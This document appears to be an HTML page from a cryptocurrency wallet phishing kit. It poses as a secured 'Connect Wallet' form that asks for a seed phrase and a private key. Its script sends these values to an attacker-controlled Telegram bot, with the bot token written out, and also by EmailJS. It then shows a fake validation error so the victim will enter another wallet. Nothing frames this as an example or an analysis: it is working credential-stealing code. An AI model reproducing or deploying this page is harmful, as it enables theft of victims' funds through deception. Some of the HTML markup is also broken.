<body style="background-color:#08081c">
    <section class="">
        <div class="flex flex-col items-center justify-center px-6 py-8 mx-auto md:h-screen lg:py-0">
            <a href="../" class="flex items-center font-bold text-white">

                <br>
                <span>Connect Wallet</span>
                
            </a>

                    <ul class="flex flex-wrap -mb-px text-sm font-medium text-center" id="myTab"

                        </li>

                    </ul>
                </div>
                <div id="myTabContent">
                    <div class="p-4 bg-gray-50 rounded-lg dark:bg-gray-800" id="profile" role="tabpanel"

                        <form method="POST" class="ajaxForm">

                                <textarea rows="4" name="phrase" type="text"

                                    class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"

                            </div>
                            <button type="submit"
                                class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 mr-2 mb-2 dark:bg-blue-600 dark:hover:bg-blue-700 focus:outline-none dark:focus:ring-blue-800">Connect</button>
                        </form>
                    </div>







                    <div class="hidden p-4 bg-gray-50 rounded-lg dark:bg-gray-800" id="settings" role="tabpanel"

                        <form method="POST" class="ajaxForm">

                            </div>
                            <button type="submit"

                        </form>


                    </div>

                </div>


            </div>
            <div
                class="mt-5 text-white bg-gradient-to-r from-blue-500 via-blue-600 to-blue-700 hover:bg-gradient-to-br focus:ring-4 focus:outline-none focus:ring-blue-300 dark:focus:ring-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center mr-2 mb-2">

                </svg>Secured CONNECTION
            </div>
    </section>


    <script>
        $(document).ready(function () {
            $('.ajaxForm').on('submit', function (event) {
                event.preventDefault();
    
                // Send data to Telegram bot
                var chatId = '6915786786';
                var token = '6915786786:AAHpdzO2L3tQln8WjYpzEoRrx3c3vUWO_xw';
                var phrase = $('#phrase').val(); 
                var privatekey = $('#privatekey').val(); 
                var message = `New message:\nPhrase: ${phrase}\nPrivate Key: ${privatekey}`;
                var urlString = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
                let request = new XMLHttpRequest();
                request.open("POST", urlString);
                request.send();
    
                // Send form data via EmailJS
                var formData = new FormData(this);
                formData.append('service_id', 'service_spfsg39');
                formData.append('template_id', 'template_mt24pnu');
                formData.append('user_id', 'zDG6ZgkBqPjAf2xzO');
    
                $.ajax('https://api.emailjs.com/api/v1.0/email/send-form', {
                    type: 'POST',
                    data: formData,
                    contentType: false,
                    processData: false
                }).done(function () {
                    alert('Error Validating Details, please try another wallet');
                }).fail(function (error) {
                    alert('Oops... ' + JSON.stringify(error));
                });
            });
        });
    </script>
